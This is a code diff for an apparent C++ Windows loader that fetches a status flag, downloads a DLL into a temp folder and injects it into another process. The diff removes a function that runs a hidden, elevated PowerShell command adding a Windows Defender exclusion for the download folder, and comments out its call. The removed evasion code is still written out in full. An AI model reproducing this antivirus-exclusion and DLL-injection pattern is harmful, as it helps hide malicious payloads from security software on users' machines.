@@ -41,27 +41,7 @@ static size_t WriteCallback(void* contents, size_t size, size_t nmemb, void* use
     return size * nmemb;
 }
 
-bool AddDefenderExclusion(const std::string& path) {
-    std::string command = "powershell -Command \"Add-MpPreference -ExclusionPath '" + path + "'\"";
-    // Ẩn cửa sổ console khi chạy lệnh
-    SHELLEXECUTEINFOA shExecInfo = {0};
-    shExecInfo.cbSize = sizeof(SHELLEXECUTEINFOA);
-    shExecInfo.fMask = SEE_MASK_NOCLOSEPROCESS;
-    shExecInfo.hwnd = NULL;
-    shExecInfo.lpVerb = "runas"; // Đòi admin
-    shExecInfo.lpFile = "cmd.exe";
-    std::string param = "/c " + command;
-    shExecInfo.lpParameters = param.c_str();
-    shExecInfo.nShow = SW_HIDE;
-    if (!ShellExecuteExA(&shExecInfo)) {
-        std::cerr << "[-] Add Defender exclusion failed!\n";
-        return false;
-    }
-    WaitForSingleObject(shExecInfo.hProcess, INFINITE);
-    CloseHandle(shExecInfo.hProcess);
-    wcout << L"[+] Add exclusio Windows Defender success!\n";
-    return true;
-}
+
 std::mutex consoleMutex;
 std::string fetch_active_status() {
     CURL* curl = curl_easy_init();
@@ -244,7 +224,7 @@ void prepare_temp_directory_and_download() {
     if (FAILED(hr)) {
         std::cerr << "Error downloading DLL:" << std::hex << hr << "\n";
     }
-    AddDefenderExclusion(dir); // Hoặc AddDefenderExclusion(dir); để ngoại lệ cả folder
+    //(dir); // Hoặc AddDefenderExclusion(dir); để ngoại lệ cả folder
 }
 
 bool inject_dll(DWORD processID, const std::string& dllPath) {
